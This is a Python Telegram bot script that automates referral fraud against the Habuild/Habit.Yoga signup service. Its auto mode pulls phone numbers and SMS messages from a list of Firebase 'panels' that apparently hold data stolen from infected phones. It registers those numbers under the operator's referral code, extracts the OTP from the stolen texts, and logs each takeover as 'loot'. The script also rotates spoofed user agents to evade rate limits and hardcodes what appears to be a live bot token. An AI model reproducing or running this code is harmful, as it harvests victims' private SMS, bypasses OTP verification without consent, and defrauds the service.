import os
import sys
import re
import time
import uuid
import json
import random
import asyncio
import sqlite3
import logging
import aiohttp
import requests
from datetime import datetime
from typing import Optional
from telebot import TeleBot, types
import threading

# ================= LOGGING =================
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.WARNING,
)

# ================= CONFIGURATION =================
BOT_TOKEN = "8841593698:AAFucNhM325wguWpdk-lFK6XI6tptwVzJIg"
ADMIN_ID = 8403468945
HABIT_REF = "adnan94901186"
# =================================================

bot = TeleBot(BOT_TOKEN)
BOT_USERNAME = "System_bypassbot"

# ================= DATABASE =================
DB_FILE = 'bot_stats.db'

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    
    # Users table
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id TEXT PRIMARY KEY,
        referral_code TEXT,
        total_registers INTEGER DEFAULT 0,
        last_register TEXT,
        first_name TEXT
    )''')
    
    # Temp sessions for manual registration
    c.execute('''CREATE TABLE IF NOT EXISTS temp_sessions (
        user_id TEXT PRIMARY KEY,
        device_id TEXT,
        session_id TEXT,
        name TEXT,
        phone TEXT,
        otp_ref TEXT,
        created_at TIMESTAMP
    )''')
    
    # Auto bot stats
    c.execute('''CREATE TABLE IF NOT EXISTS auto_stats (
        id INTEGER PRIMARY KEY,
        total_referrals INTEGER DEFAULT 0,
        total_numbers_fetched INTEGER DEFAULT 0,
        last_run TIMESTAMP
    )''')
    
    # Used numbers for auto bot
    c.execute('''CREATE TABLE IF NOT EXISTS used_numbers (
        number TEXT PRIMARY KEY
    )''')
    
    # Insert initial stats
    c.execute("SELECT * FROM auto_stats WHERE id = 1")
    if not c.fetchone():
        c.execute("INSERT INTO auto_stats (id, total_referrals, total_numbers_fetched) VALUES (1, 0, 0)")
    
    conn.commit()
    conn.close()
    print("✅ Database initialized")

init_db()

# ================= FIREBASE PANELS =================
PANELS = [
    "https://santosh-8-default-rtdb.firebaseio.com",
    "https://dogla-de225-default-rtdb.firebaseio.com",
    "https://alienware-c11b0-default-rtdb.firebaseio.com",
    "https://jaduopop-a9a12-default-rtdb.firebaseio.com",
    "https://raja-bhaiya-62-default-rtdb.firebaseio.com",
    "https://roy8-c8fe7-default-rtdb.firebaseio.com",
    "https://aaenop720-34097-default-rtdb.firebaseio.com",
    "https://strange-2e4aa-default-rtdb.firebaseio.com",
    "https://nitish-253e7-default-rtdb.firebaseio.com",
    "https://arvind-c5b03-default-rtdb.firebaseio.com",
    "https://ajay-33c1b-default-rtdb.firebaseio.com",
    "https://newrto30-default-rtdb.firebaseio.com",
]

# ================= INDIAN NAMES =================
INDIAN_NAMES = ['Arjun', 'Aryan', 'Rohan', 'Vihaan', 'Shaurya', 'Advik', 'Kabir', 'Dhruv', 'Krishna', 
                'Aadhya', 'Ananya', 'Diya', 'Ishita', 'Kiara', 'Myra', 'Navya', 'Prisha', 'Sara', 'Tanvi',
                'Rahul', 'Vikram', 'Karan', 'Aditya', 'Rishi', 'Aarav', 'Vedant', 'Abhinav', 'Yash', 'Reyansh',
                'Anika', 'Arohi', 'Tara', 'Meera', 'Priya', 'Riya', 'Kriti', 'Shruti', 'Tanya', 'Pooja']

# ================= HELPER FUNCTIONS =================
def generate_id():
    return str(uuid.uuid4())

def format_phone_number(phone):
    phone = phone.strip()
    digits = re.sub(r'\D', '', phone)
    if phone.startswith('+91'):
        return phone
    elif phone.startswith('91') and len(digits) == 12:
        return f"+{digits}"
    elif len(digits) == 10:
        return f"+91{digits}"
    else:
        return None

def get_random_name():
    return random.choice(INDIAN_NAMES)

# ================= MANUAL REGISTRATION FUNCTIONS =================
def save_temp_session(user_id, device_id, session_id, name, phone, otp_ref=None):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO temp_sessions VALUES (?, ?, ?, ?, ?, ?, ?)",
              (user_id, device_id, session_id, name, phone, otp_ref, datetime.now()))
    conn.commit()
    conn.close()

def get_temp_session(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT * FROM temp_sessions WHERE user_id = ?", (user_id,))
    result = c.fetchone()
    conn.close()
    if result:
        return {'device_id': result[1], 'session_id': result[2], 'name': result[3], 
                'phone': result[4], 'otp_ref': result[5]}
    return None

def delete_temp_session(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("DELETE FROM temp_sessions WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()

def update_user_stats(user_id, referral_code):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT INTO users (user_id, referral_code, total_registers) VALUES (?, ?, 1) "
              "ON CONFLICT(user_id) DO UPDATE SET "
              "total_registers = total_registers + 1, "
              "referral_code = COALESCE(?, referral_code)",
              (user_id, referral_code, referral_code))
    conn.commit()
    conn.close()

def get_user_stats(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT referral_code, total_registers, last_register FROM users WHERE user_id = ?", (user_id,))
    result = c.fetchone()
    conn.close()
    return {'referral_code': result[0], 'total': result[1], 'last': result[2]} if result else None

def update_auto_stats(total_referrals=None, numbers_fetched=None):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    if total_referrals is not None:
        c.execute("UPDATE auto_stats SET total_referrals = ?, last_run = ? WHERE id = 1", 
                  (total_referrals, datetime.now().isoformat()))
    if numbers_fetched is not None:
        c.execute("UPDATE auto_stats SET total_numbers_fetched = total_numbers_fetched + ? WHERE id = 1", 
                  (numbers_fetched,))
    conn.commit()
    conn.close()

def get_auto_stats():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT total_referrals, total_numbers_fetched, last_run FROM auto_stats WHERE id = 1")
    result = c.fetchone()
    conn.close()
    return {'referrals': result[0], 'numbers': result[1], 'last_run': result[2]} if result else None

def save_used_number(num):
    try:
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("INSERT OR IGNORE INTO used_numbers (number) VALUES (?)", (num,))
        conn.commit()
        conn.close()
    except: pass

def load_used_numbers():
    try:
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT number FROM used_numbers")
        result = [row[0] for row in c.fetchall()]
        conn.close()
        return set(result)
    except: return set()

# ================= 🔥 AUTO PANEL FETCH FUNCTIONS =================
_http_session = None
dead_panels = set()
GLOBAL_DEVICE_CACHE = {}

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 12; OnePlus 9 Pro) AppleWebKit/537.36 Chrome/118.0.0.0 Mobile Safari/537.36",
]

def get_random_headers():
    ua = random.choice(USER_AGENTS)
    headers = {
        "User-Agent": ua,
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://portal.habuild.in",
        "Referer": "https://portal.habuild.in/",
        "Accept-Language": "en-US,en;q=0.9,hi-IN;q=0.8",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "cross-site"
    }
    if "Android" in ua:
        headers["sec-ch-ua-platform"] = '"Android"'
        headers["sec-ch-ua-mobile"] = "?1"
    elif "iPhone" in ua:
        headers["sec-ch-ua-platform"] = '"iOS"'
        headers["sec-ch-ua-mobile"] = "?1"
    return headers, ua

async def get_http_session():
    global _http_session
    if _http_session is None or _http_session.closed:
        connector = aiohttp.TCPConnector(limit=10000, keepalive_timeout=60)
        _http_session = aiohttp.ClientSession(connector=connector)
    return _http_session

async def fb_get(path: str, base: str):
    if base in dead_panels: return None
    try:
        session = await get_http_session()
        url = f"{base}/{path}.json" if path else f"{base}/.json?shallow=true"
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=4)) as r:
            if r.status != 200: return None
            data = await r.json(content_type=None)
            return data if isinstance(data, dict) else None
    except: return None

def extract_all_nums(*dicts):
    nums = []
    keys_to_check = ["sim1Number", "sim2Number", "numberSim1", "numberSim2", "mobNo", "phoneNumber", "phone", "mobile"]
    for d in dicts:
        if not isinstance(d, dict): continue
        for k in keys_to_check:
            val = str(d.get(k, ""))
            if val and len(re.sub(r"\D", "", val)) > 9:
                clean = re.sub(r"\D", "", val)
                if len(clean) >= 10: nums.append(clean[-10:])
    return list(set(nums))

async def fetch_db_data(tag: str, url: str):
    devices_list = []
    try:
        sim_all, device_info_all, user_data_all = await asyncio.gather(
            fb_get("All_Users/simDetails", url), 
            fb_get("All_Users/Data/DeviceInfo", url),
            fb_get("user_data", url), return_exceptions=True
        )
        if isinstance(sim_all, dict):
            info_all = device_info_all if isinstance(device_info_all, dict) else {}
            for dev_id, sim in sim_all.items():
                info = info_all.get(dev_id) or {}
                nums = extract_all_nums(sim, info)
                status = "online" if str(info.get("Status")).lower() == "online" else "offline"
                devices_list.append({"id": dev_id, "numbers": nums, "status": status, "base": url, "path": f"All_Users/sms/{dev_id}"})
                
        if isinstance(user_data_all, dict):
            for dev_id, data in user_data_all.items():
                if not isinstance(data, dict): continue
                nums = extract_all_nums(data)
                status = "online" if str(data.get("status")).lower() == "online" else "offline"
                devices_list.append({"id": dev_id, "numbers": nums, "status": status, "base": url, "path": f"user_sms/{dev_id}"})
    except Exception:
        dead_panels.add(url)
    return devices_list

# ================= 🔥 AUTO REGISTRATION ENGINE =================
pending_habuild = {}
looted_count = [0]
number_queue = None
auto_bot_running = False
auto_bot_task = None

async def trigger_auto_registration(phone_10d: str, worker_id: int, real_name: str):
    phone_full = f"+91{phone_10d}"
    device_id = str(uuid.uuid4())
    session_id = str(uuid.uuid4())

    try:
        session = await get_http_session()
        headers, chosen_ua = get_random_headers()
        
        # Register
        reg_url = "https://auth-service.habuild.in/public/user/v1/register-user"
        reg_payload = {
            "name": real_name,
            "phoneNumber": phone_full,
            "referredBy": HABIT_REF,
            "sourceData": {"type": "Referral", "refererurl": "", "timezone": "Asia/Kolkata"},
            "experimentMetaInfo": {"deviceId": device_id, "sessionId": session_id}
        }
        
        async with session.post(reg_url, json=reg_payload, headers=headers, timeout=10) as r:
            if r.status == 429:
                await number_queue.put((phone_10d, real_name))
                return
            res = await r.json()
            if res.get('message') == 'success':
                # Send OTP
                log_url = "https://auth-service.habuild.in/public/auth/v1/login"
                log_payload = {
                    "method": "phone_otp",
                    "otpChannel": "sms",
                    "phoneNumber": phone_full,
                    "sourceData": {"type": "portal", "utm_source": "whatsapp"},
                    "experimentMetaInfo": {"deviceId": device_id, "sessionId": str(uuid.uuid4())},
                    "registerUser": False
                }
                async with session.post(log_url, json=log_payload, headers=headers, timeout=10) as lr:
                    if lr.status == 429:
                        await number_queue.put((phone_10d, real_name))
                        return
                    lres = await lr.json()
                    if lres.get('message') == 'OTP sent to your phone':
                        ref_code = lres.get('data', {}).get('refrence_code')
                        pending_habuild[phone_10d] = {
                            "phone": phone_full,
                            "otp_ref": ref_code,
                            "device_id": device_id,
                            "session_id": session_id,
                            "user_agent": chosen_ua,
                            "name": real_name,
                            "timestamp": time.time()
                        }
                        print(f"⚡ AUTO: OTP sent to {phone_10d}")
                        
                        # Try to get OTP from panels
                        for attempt in range(10):
                            await asyncio.sleep(3)
                            otp = await get_otp_from_panels(phone_10d)
                            if otp:
                                await verify_auto_otp(phone_10d, otp)
                                break
    except Exception as e:
        print(f"Auto registration error: {e}")

async def get_otp_from_panels(phone: str):
    """Get OTP from all panels"""
    for url in PANELS:
        if url in dead_panels: continue
        try:
            r_main, r_user = await asyncio.gather(
                fb_get("All_Users/sms", url),
                fb_get("user_sms", url),
                return_exceptions=True
            )
            for bulk_data in (r_main, r_user):
                if not isinstance(bulk_data, dict): continue
                for dev_id, sms_dict in bulk_data.items():
                    if not isinstance(sms_dict, dict): continue
                    for sms_id, sms in sms_dict.items():
                        if not isinstance(sms, dict): continue
                        body = str(sms.get("body") or sms.get("message") or sms.get("text") or "")
                        sender = str(sms.get("sender") or "")
                        otp_match = re.search(r"\b(\d{6})\b", body)
                        if otp_match and ("HABUILD" in sender.upper() or "Habuild" in body):
                            return otp_match.group(1)
        except: pass
    return None

async def verify_auto_otp(phone_10d: str, otp: str):
    data = pending_habuild.pop(phone_10d, None)
    if not data: return

    url = "https://auth-service.habuild.in/public/auth/v1/verify-otp"
    payload = {
        "phone": data['phone'],
        "reference_code": data['otp_ref'],
        "otp": otp,
        "experimentMetaInfo": {"deviceId": data['device_id'], "sessionId": str(uuid.uuid4())},
        "registerUser": False
    }
    try:
        session = await get_http_session()
        headers, _ = get_random_headers()
        
        async with session.post(url, json=payload, headers=headers, timeout=10) as r:
            res = await r.json()
            if res.get('message') == 'OTP verified successfully':
                looted_count[0] += 1
                member = res.get('data', {}).get('member', {})
                member_name = member.get('name', data['name'])
                update_auto_stats(total_referrals=looted_count[0])
                
                msg = f"🎯 *AUTO LOOT SUCCESSFUL!*\n\n📱 Number: `{data['phone']}`\n👤 Name: *{member_name}*\n🔑 Code: `{HABIT_REF}`\n✅ *TOTAL: {looted_count[0]}* 🚀"
                if bot: bot.send_message(ADMIN_ID, msg, parse_mode='Markdown')
                print(f"🎯 AUTO TOTAL: {looted_count[0]}")
                save_used_number(phone_10d)
    except Exception as e:
        print(f"Auto verify error: {e}")

async def auto_register_engine():
    print("🚀 Auto Registration Engine Started!")
    
    while True:
        try:
            numbers = await get_all_numbers_from_panels()
            if not numbers:
                await asyncio.sleep(30)
                continue
            
            used = load_used_numbers()
            new_numbers = [num for num in numbers if num not in used]
            
            if not new_numbers:
                await asyncio.sleep(30)
                continue
            
            print(f"🆕 Processing {len(new_numbers)} new numbers...")
            
            for phone in new_numbers[:50]:
                name = get_random_name()
                save_used_number(phone)
                await number_queue.put((phone, name))
                await asyncio.sleep(0.5)
                
        except Exception as e:
            print(f"Engine error: {e}")
            await asyncio.sleep(30)

async def get_all_numbers_from_panels():
    all_numbers = []
    for url in PANELS:
        if url in dead_panels: continue
        try:
            devices = await fetch_db_data("", url)
            for device in devices:
                if device.get("status") == "online":
                    for num in device.get("numbers", []):
                        if num and len(num) == 10:
                            all_numbers.append(num)
        except: pass
    return list(set(all_numbers))

async def api_worker(worker_id: int):
    while True:
        try:
            num, real_name = await number_queue.get()
            await trigger_auto_registration(num, worker_id, real_name)
            number_queue.task_done()
            await asyncio.sleep(0.1)
        except:
            await asyncio.sleep(0.5)

# ================= TELEGRAM COMMANDS =================
@bot.message_handler(commands=['start'])
def start(message):
    user_id = str(message.chat.id)
    bot.clear_step_handler_by_chat_id(message.chat.id)
    
    stats = get_user_stats(user_id)
    
    # Welcome message with auto stats
    auto_stats = get_auto_stats()
    auto_text = f"\n🤖 *Auto Bot:* {auto_stats['referrals'] if auto_stats else 0} referrals"
    
    if stats and stats['referral_code']:
        bot.reply_to(message, 
            f"👋 Welcome back!\nYour refer code: `{stats['referral_code']}`\nTotal: {stats['total']}{auto_text}\n\nSend /register to start manual registration", 
            parse_mode='Markdown')
    else:
        bot.reply_to(message, 
            f"📌 Send your Habit.Yoga referral link or code first.\nExample: `anik82bab483`\nOr send /cancel to abort{auto_text}", 
            parse_mode='Markdown')
        bot.register_next_step_handler(message, set_referral)

@bot.message_handler(commands=['cancel'])
def cancel(message):
    user_id = str(message.chat.id)
    delete_temp_session(user_id)
    bot.clear_step_handler_by_chat_id(message.chat.id)
    bot.reply_to(message, "❌ Cancelled!\nYou can start over with /register")
    print(f"🔄 User {user_id} cancelled current operation")

@bot.message_handler(commands=['register'])
def register(message):
    user_id = str(message.chat.id)
    bot.clear_step_handler_by_chat_id(message.chat.id)
    
    stats = get_user_stats(user_id)
    
    if not stats or not stats['referral_code']:
        bot.reply_to(message, "❌ Set refer code first. Send it now:\nOr send /cancel")
        bot.register_next_step_handler(message, set_referral)
        return
    
    msg = bot.reply_to(message, "📱 Send 10-digit Indian mobile number\nExample: `9876543210`\nSend /cancel to abort", parse_mode='Markdown')
    bot.register_next_step_handler(msg, process_phone)

def set_referral(message):
    if message.text and message.text.startswith('/'):
        bot.reply_to(message, "❌ Cancelled. Send /register to try again")
        return
    
    user_id = str(message.chat.id)
    code = message.text.strip()
    
    if code:
        update_user_stats(user_id, code)
        bot.reply_to(message, f"✅ Refer code saved: `{code}`\nSend /register to continue", parse_mode='Markdown')
    else:
        bot.reply_to(message, "❌ Invalid! Send valid code\nOr send /cancel", parse_mode='Markdown')
        bot.register_next_step_handler(message, set_referral)

def process_phone(message):
    if message.text and message.text.startswith('/'):
        bot.reply_to(message, "❌ Cancelled. Send /register to try again")
        return
    
    user_id = str(message.chat.id)
    raw_phone = message.text.strip()
    phone = format_phone_number(raw_phone)
    
    if not phone:
        bot.reply_to(message, "❌ Invalid! Send 10-digit number like: `9876543210`\nSend /cancel to abort", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_phone)
        return
    
    name = random.choice(INDIAN_NAMES)
    device_id = generate_id()
    session_id = generate_id()
    
    save_temp_session(user_id, device_id, session_id, name, phone, None)
    
    stats = get_user_stats(user_id)
    msg = bot.reply_to(message, "⏳ Registering...")
    
    url = "https://auth-service.habuild.in/public/user/v1/register-user"
    payload = {
        "name": name,
        "phoneNumber": phone,
        "referredBy": stats['referral_code'],
        "sourceData": {"type": "Referral", "refererurl": "", "timezone": "Asia/Kolkata"},
        "experimentMetaInfo": {"deviceId": device_id, "sessionId": session_id}
    }
    
    try:
        response = requests.post(url, json=payload, timeout=30)
        result = response.json()
        
        if result.get('message') == 'success':
            send_otp(message, user_id, phone, device_id)
            bot.delete_message(msg.chat.id, msg.message_id)
        else:
            error_msg = result.get('message', 'Error')
            bot.edit_message_text(f"❌ Failed: {error_msg}\nSend /register to try again", msg.chat.id, msg.message_id)
    except Exception as e:
        bot.edit_message_text(f"❌ Error: {str(e)[:50]}\nSend /register to try again", msg.chat.id, msg.message_id)

def send_otp(message, user_id, phone, device_id):
    url = "https://auth-service.habuild.in/public/auth/v1/login"
    payload = {
        "method": "phone_otp",
        "otpChannel": "sms",
        "phoneNumber": phone,
        "sourceData": {"type": "portal", "utm_source": "whatsapp"},
        "experimentMetaInfo": {"deviceId": device_id, "sessionId": generate_id()},
        "registerUser": False
    }
    
    try:
        response = requests.post(url, json=payload, timeout=30)
        result = response.json()
        
        if result.get('message') == 'OTP sent to your phone':
            ref_code = result.get('data', {}).get('refrence_code')
            session = get_temp_session(user_id)
            if session:
                save_temp_session(user_id, session['device_id'], session['session_id'], 
                                session['name'], session['phone'], ref_code)
            
            phone_display = phone[-10:]
            msg = bot.reply_to(message, f"📲 OTP sent to {phone_display}\nSend 6-digit code:\nSend /cancel to abort")
            bot.register_next_step_handler(msg, verify_otp)
        else:
            bot.reply_to(message, f"❌ OTP failed: {result.get('message', 'Error')}\nSend /register to try again")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)[:50]}\nSend /register to try again")

def verify_otp(message):
    if message.text and message.text.startswith('/'):
        bot.reply_to(message, "❌ Cancelled. Send /register to try again")
        return
    
    user_id = str(message.chat.id)
    otp = message.text.strip()
    
    if not otp.isdigit() or len(otp) != 6:
        bot.reply_to(message, "❌ Invalid! Send 6-digit OTP:\nSend /cancel to abort")
        bot.register_next_step_handler(message, verify_otp)
        return
    
    session = get_temp_session(user_id)
    if not session:
        bot.reply_to(message, "❌ Session expired. Send /register again")
        return
    
    url = "https://auth-service.habuild.in/public/auth/v1/verify-otp"
    payload = {
        "phone": session['phone'],
        "reference_code": session['otp_ref'],
        "otp": otp,
        "experimentMetaInfo": {"deviceId": session['device_id'], "sessionId": generate_id()},
        "registerUser": False
    }
    
    try:
        response = requests.post(url, json=payload, timeout=30)
        result = response.json()
        
        if result.get('message') == 'OTP verified successfully':
            stats = get_user_stats(user_id)
            update_user_stats(user_id, stats['referral_code'])
            
            conn = sqlite3.connect(DB_FILE)
            c = conn.cursor()
            c.execute("UPDATE users SET last_register = ? WHERE user_id = ?", 
                     (datetime.now().strftime("%Y-%m-%d %H:%M:%S"), user_id))
            conn.commit()
            conn.close()
            
            delete_temp_session(user_id)
            new_stats = get_user_stats(user_id)
            
            success_msg = f"✅ Verified! Registered #{new_stats['total']}\n"
            success_msg += f"👤 Name: {result.get('data', {}).get('member', {}).get('name', 'N/A')}\n"
            success_msg += f"🆔 Member ID: {result.get('data', {}).get('member', {}).get('legacy_free_id', 'N/A')}\n"
            success_msg += f"\nSend /register again or /me for stats"
            
            bot.reply_to(message, success_msg)
        else:
            bot.reply_to(message, f"❌ Wrong OTP! Send /register to try again")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)[:50]}\nSend /register to try again")

@bot.message_handler(commands=['me'])
def show_stats(message):
    user_id = str(message.chat.id)
    stats = get_user_stats(user_id)
    auto_stats = get_auto_stats()
    
    if stats:
        text = f"📊 *Your Stats*\n\n"
        text += f"🔗 Refer Code: `{stats['referral_code']}`\n"
        text += f"✅ Total Registers: *{stats['total']}*\n"
        if stats['last']:
            text += f"📅 Last: `{stats['last'][:16]}`\n"
        text += f"\n🤖 *Auto Bot Stats:*\n"
        text += f"🎯 Auto Referrals: *{auto_stats['referrals'] if auto_stats else 0}*\n"
        text += f"📱 Numbers Fetched: *{auto_stats['numbers'] if auto_stats else 0}*"
        bot.reply_to(message, text, parse_mode='Markdown')
    else:
        bot.reply_to(message, "No data found. Send your refer code first.")

@bot.message_handler(commands=['startauto'])
def start_auto(message):
    global auto_bot_running, auto_bot_task, number_queue
    user_id = str(message.chat.id)
    if user_id != str(ADMIN_ID):
        bot.reply_to(message, "❌ Only admin can start auto bot!")
        return
    
    if auto_bot_running:
        bot.reply_to(message, "❌ Auto Bot is already running!")
        return
    
    auto_bot_running = True
    number_queue = asyncio.Queue()
    bot.reply_to(message, "🚀 Auto Bot Started! Fetching numbers from panels...")
    
    def run_auto_bot():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        loop.run_until_complete(auto_register_engine())
        loop.run_until_complete(asyncio.sleep(1))
    
    auto_bot_task = threading.Thread(target=run_auto_bot, daemon=True)
    auto_bot_task.start()

@bot.message_handler(commands=['stopauto'])
def stop_auto(message):
    global auto_bot_running
    user_id = str(message.chat.id)
    if user_id != str(ADMIN_ID):
        bot.reply_to(message, "❌ Only admin can stop auto bot!")
        return
    
    if not auto_bot_running:
        bot.reply_to(message, "❌ Auto Bot is not running!")
        return
    
    auto_bot_running = False
    bot.reply_to(message, "⏹ Auto Bot Stopped!")

@bot.message_handler(commands=['help'])
def help_cmd(message):
    text = """
*Commands:*
/start - Begin setup
/register - Start new manual registration
/me - Your stats
/cancel - Cancel current operation
/help - This help

*Admin Commands:*
/startauto - Start auto registration bot
/stopauto - Stop auto registration bot

*Flow:*
1. Send your refer code/link
2. Send 10-digit mobile number
3. Enter OTP received
4. Done!

*Auto Bot:* Automatically fetches numbers from panels and registers them!
    """
    bot.reply_to(message, text, parse_mode='Markdown')

@bot.message_handler(func=lambda message: True)
def fallback(message):
    bot.reply_to(message, "❌ Invalid command. Use /help for commands")

# ================= MAIN =================
if __name__ == "__main__":
    print("=" * 50)
    print("🤖 MERGED BOT - MANUAL + AUTO")
    print("=" * 50)
    print(f"🔑 Referral Code: {HABIT_REF}")
    print(f"📱 Panels Loaded: {len(PANELS)}")
    print(f"👑 Admin ID: {ADMIN_ID}")
    print("=" * 50)
    print("✅ Bot is running!")
    print("📌 Commands:")
    print("   /start - Start")
    print("   /register - Manual registration")
    print("   /startauto - Start auto bot (Admin only)")
    print("   /stopauto - Stop auto bot (Admin only)")
    print("=" * 50)
    
    bot.infinity_polling(timeout=20, long_polling_timeout=20, skip_pending=True)
